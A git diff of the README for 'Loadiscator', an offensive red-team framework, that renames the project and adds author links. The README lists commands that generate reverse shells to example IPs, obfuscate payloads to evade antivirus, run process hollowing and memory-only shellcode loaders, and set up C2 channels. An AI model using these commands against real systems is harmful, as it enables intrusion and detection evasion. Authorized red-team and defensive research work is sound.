@@ -1,4 +1,4 @@
-# Loadifscator
+# Loadiscator
 
 **Modular Red Team Payload Generator & Obfuscation Framework**
 
@@ -27,7 +27,7 @@
 
 ## Overview
 
-**Loadifscator** is a modular, extensible framework for generating, obfuscating, and delivering payloads for red team operations, adversary simulation, and AV/EDR evasion research. It supports multiple languages, advanced obfuscation, encryption, fileless execution, and C2 integrations. The framework is designed for both CLI and (optionally) web GUI usage, with a focus on research, education, and authorized security testing.
+**Loadiscator** is a modular, extensible framework for generating, obfuscating, and delivering payloads for red team operations, adversary simulation, and AV/EDR evasion research. It supports multiple languages, advanced obfuscation, encryption, fileless execution, and C2 integrations. The framework is designed for both CLI and (optionally) web GUI usage, with a focus on research, education, and authorized security testing.
 
 ---
 
@@ -84,8 +84,8 @@
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/yourname/loadifscator.git
-cd loadifscator
+git clone https://github.com/PardhuSreeRushiVarma20060119/loadiscator.git
+cd loadiscator
 ```
 
 ### 2. Install Python Dependencies
@@ -115,22 +115,22 @@ pip install -r requirements.txt
 
 ### Generate a Python Reverse Shell
 ```bash
-python -m loadifscator.cli generate python 10.10.10.10 4444 -o reverse.py
+python -m loadiscator.cli generate python 10.10.10.10 4444 -o reverse.py
 ```
 
 ### Obfuscate the Payload (Polymorphic)
 ```bash
-python -m loadifscator.cli obfuscate polymorphic --file reverse.py -o poly_reverse.py
+python -m loadiscator.cli obfuscate polymorphic --file reverse.py -o poly_reverse.py
 ```
 
 ### Encrypt the Payload
 ```bash
-python -m loadifscator.cli encrypt --file poly_reverse.py --key "S3cr3tK3y123" -o encrypted.py
+python -m loadiscator.cli encrypt --file poly_reverse.py --key "S3cr3tK3y123" -o encrypted.py
 ```
 
 ### Generate a One-Liner
 ```bash
-python -m loadifscator.cli oneliner --file encrypted.py --lang python
+python -m loadiscator.cli oneliner --file encrypted.py --lang python
 ```
 
 ---
@@ -139,17 +139,17 @@ python -m loadifscator.cli oneliner --file encrypted.py --lang python
 
 ### 1. Payload Generation
 ```
-python -m loadifscator.cli generate [LANG] [IP] [PORT] -o [OUTPUT]
+python -m loadiscator.cli generate [LANG] [IP] [PORT] -o [OUTPUT]
 ```
 - LANG: python, bash, powershell, c
-- Example: `python -m loadifscator.cli generate bash 192.168.1.5 9001 -o rev.sh`
+- Example: `python -m loadiscator.cli generate bash 192.168.1.5 9001 -o rev.sh`
 
 ### 2. Obfuscation
 ```
-python -m loadifscator.cli obfuscate [TYPE] --file [INPUT] -o [OUTPUT] [--key KEY]
+python -m loadiscator.cli obfuscate [TYPE] --file [INPUT] -o [OUTPUT] [--key KEY]
 ```
 - TYPE: base64, xor, stringmangle, polymorphic
-- Example: `python -m loadifscator.cli obfuscate xor --file rev.sh -o rev_xor.sh --key secret`
+- Example: `python -m loadiscator.cli obfuscate xor --file rev.sh -o rev_xor.sh --key secret`
 
 ### 3. Encryption
 ```
@@ -158,42 +158,41 @@ python -m loadifscator.cli encrypt --file [INPUT] --key [KEY] -o [OUTPUT]
 
 ### 4. One-Liner Encoding
 ```
-python -m loadifscator.cli oneliner --file [INPUT] --lang [LANG]
+python -m loadiscator.cli oneliner --file [INPUT] --lang [LANG]
 ```
 
 ### 5. AI-Powered Payload Optimization
 ```
-python -m loadifscator.cli ai-optimize --file [INPUT] --target [AV] -o [OUTPUT]
+python -m loadiscator.cli ai-optimize --file [INPUT] --target [AV] -o [OUTPUT]
 ```
-- Example: `python -m loadifscator.cli ai-optimize --file reverse.py --target generic -o ai_optimized.py`
+- Example: `python -m loadiscator.cli ai-optimize --file reverse.py --target generic -o ai_optimized.py`
 
 ### 6. Metamorphic Obfuscation
 ```
-python -m loadifscator.cli metamorphic --file [INPUT] --iterations [N] -o [OUTPUT]
+python -m loadiscator.cli metamorphic --file [INPUT] --iterations [N] -o [OUTPUT]
 ```
 
 ### 7. Process Hollowing
 ```
 python -m loadifscator.cli hollow --process [PROCESS] -o [OUTPUT]
 ```
-- Example: `python -m loadifscator.cli hollow --process notepad.exe -o hollow_payload.py`
+- Example: `python -m loadiscator.cli hollow --process notepad.exe -o hollow_payload.py`
 
 ### 8. Memory-Only Shellcode Loader
 ```
 python -m loadifscator.cli memory-only --shellcode [SHELLCODE.BIN] -o [OUTPUT]
 ```
-- Example: `python -m loadifscator.cli memory-only --shellcode calc_launcher.bin -o calc_loader.py`
+- Example: `python -m loadiscator.cli memory-only --shellcode calc_launcher.bin -o calc_loader.py`
 
 ### 9. Living-Off-The-Land Payloads
 ```
-python -m loadifscator.cli living-off-land --technique [TECHNIQUE] --payload [PAYLOAD] -o [OUTPUT]
+python -m loadiscator.cli living-off-land --technique [TECHNIQUE] --payload [PAYLOAD] -o [OUTPUT]
 ```
 - Techniques: powershell, wmi, registry, schtasks, com, certutil, rundll32
 
 ### 10. C2 Integrations
-- MirageC2: `python -m loadifscator.cli c2-mirage --server [URL] --listener [NAME] --key [APIKEY] -o [OUTPUT]`
-- DNS Tunnel: `python -m loadifscator.cli dns-tunnel --domain [DOMAIN] --server [C2IP] -o [OUTPUT]`
-- HTTP Blend: `python -m loadifscator.cli http-blend --url [C2URL] -o [OUTPUT]`
+- DNS Tunnel: `python -m loadiscator.cli dns-tunnel --domain [DOMAIN] --server [C2IP] -o [OUTPUT]`
+- HTTP Blend: `python -m loadiscator.cli http-blend --url [C2URL] -o [OUTPUT]`
 
 ---
 
@@ -252,24 +251,24 @@ python generate_shellcode.py calc
 ### 1. Fileless Memory-Only Execution
 ```bash
 python generate_shellcode.py calc
-python -m loadifscator.cli memory-only --shellcode calc_launcher.bin -o calc_loader.py
+python -m loadiscator.cli memory-only --shellcode calc_launcher.bin -o calc_loader.py
 ```
 
 ### 2. Polymorphic + Metamorphic + AI Optimization
 ```bash
-python -m loadifscator.cli obfuscate polymorphic --file reverse.py -o poly.py
-python -m loadifscator.cli metamorphic --file poly.py --iterations 2 -o meta.py
-python -m loadifscator.cli ai-optimize --file meta.py --target generic -o final.py
+python -m loadiscator.cli obfuscate polymorphic --file reverse.py -o poly.py
+python -m loadiscator.cli metamorphic --file poly.py --iterations 2 -o meta.py
+python -m loadiscator.cli ai-optimize --file meta.py --target generic -o final.py
 ```
 
 ### 3. Living-Off-The-Land Payload
 ```bash
-python -m loadifscator.cli living-off-land --technique powershell --payload reverse.py -o lotl_payload.ps1
+python -m loadiscator.cli living-off-land --technique powershell --payload reverse.py -o lotl_payload.ps1
 ```
 
 ### 4. C2 Integration (MirageC2)
 ```bash
-python -m loadifscator.cli c2-mirage --server http://mirage.local --listener mylistener --key APIKEY123 -o mirage_payload.py
+python -m loadiscator.cli c2-mirage --server http://mirage.local --listener mylistener --key APIKEY123 -o mirage_payload.py
 ```
 
 ---
@@ -296,7 +295,7 @@ python -m loadifscator.cli c2-mirage --server http://mirage.local --listener myl
 A: Only for authorized red team, research, and educational use. Never use for unauthorized access.
 
 **Q: Can I add my own payloads or obfuscators?**
-A: Yes! The framework is modular. Add new modules under `loadifscator/payloads/` or `loadifscator/obfuscators/`.
+A: Yes! The framework is modular. Add new modules under `loadiscator/payloads/` or `loadiscator/obfuscators/`.
 
 **Q: Does it support Linux/Mac payloads?**
 A: Bash and Python payloads are cross-platform. Windows-specific features (e.g., memory-only, process hollowing) are for Windows.
@@ -308,7 +307,7 @@ A: Set your OpenAI API key, then use the `ai-optimize` command.
 A: Yes. Use msfvenom, Donut, or the included generator for test shellcode.
 
 **Q: Is there a web GUI?**
-A: A basic web GUI is included in `loadifscator/webgui/app.py` (experimental).
+A: A basic web GUI is included in `loadiscator/webgui/app.py` (experimental).
 
 ---
 
@@ -326,7 +325,7 @@ This tool is for authorized red team operations, AV/EDR evasion research, and ed
 
 - PRs and issues welcome!
 - For questions, open an issue or contact the maintainer.
-- To add new modules, follow the structure in `loadifscator/` and submit a pull request.
+- To add new modules, follow the structure in `loadiscator/` and submit a pull request.
 - For feature requests, describe your use case and desired functionality.
 
 ---
@@ -341,7 +340,7 @@ This software is provided for research and educational purposes only. Usage with
 
 ```
 Payload&Obsfucation Framework/
-  - loadifscator/
+  - loadiscator/
     - ai/                  # AI-powered payload optimizer
     - binder/              # Payload binding modules
     - c2/                  # C2 integrations (Mirage, DNS, HTTP)
@@ -364,20 +363,10 @@ Payload&Obsfucation Framework/
 
 ## Example: Adding a New Obfuscator
 
-1. Create a new file in `loadifscator/obfuscators/`, e.g., `myobfuscator.py`.
+1. Create a new file in `loadiscator/obfuscators/`, e.g., `myobfuscator.py`.
 2. Implement a function, e.g., `def my_obfuscate(input_file, output_file): ...`
 3. Import and add it to the CLI in `cli.py`.
 4. Document usage in the README.
-
----
-
-## Example: Using the Web GUI (Experimental)
-
-```bash
-python -m loadifscator.webgui.app
-```
-- Access via `http://localhost:5000`
-- Features: Generate, obfuscate, and download payloads via browser
 
 ---
 
@@ -399,8 +388,7 @@ python -m loadifscator.webgui.app
 ---
 
 ## License
-
-[Specify your license here, e.g., MIT, GPL, etc.]
+[LICENCE](LICENCE)
 
 ---
 
@@ -408,15 +396,24 @@ python -m loadifscator.webgui.app
 
 - v1.0: Initial release with multi-language payloads, obfuscation, encryption, and C2 modules
 - v1.1: Added AI optimizer, memory-only loader, and advanced evasion
-- v1.2: Bug fixes, improved CLI, and web GUI (experimental)
+- v1.2: Bug fixes, improved CLI.
 
 ---
 
 ## Contact
 
-- [Your Name / Handle]
-- [Your Email or Twitter]
-- [Project Homepage or GitHub]
+- [LinkedIn](linkedin.com/in/pardhu-sri-rushi-varma-konduru-696886279)
+- [Github](github.com/PardhuSreeRushiVarma20060119)
+
+---
+
+## 💖 Sponsor Me
+
+I'm actively building open-source cybersecurity tools like MirageC2, PhishVault, and OpenLoRa, and Sometime Mini Tools Like This One.  
+If you find my work valuable, consider supporting it with love:
+
+[![Sponsor](https://img.shields.io/badge/Sponsor-PardhuVarma-blue?style=for-the-badge&logo=github-sponsors&logoColor=white)](https://github.com/sponsors/PardhuSreeRushiVarma20060119)
+
 
 ---
 
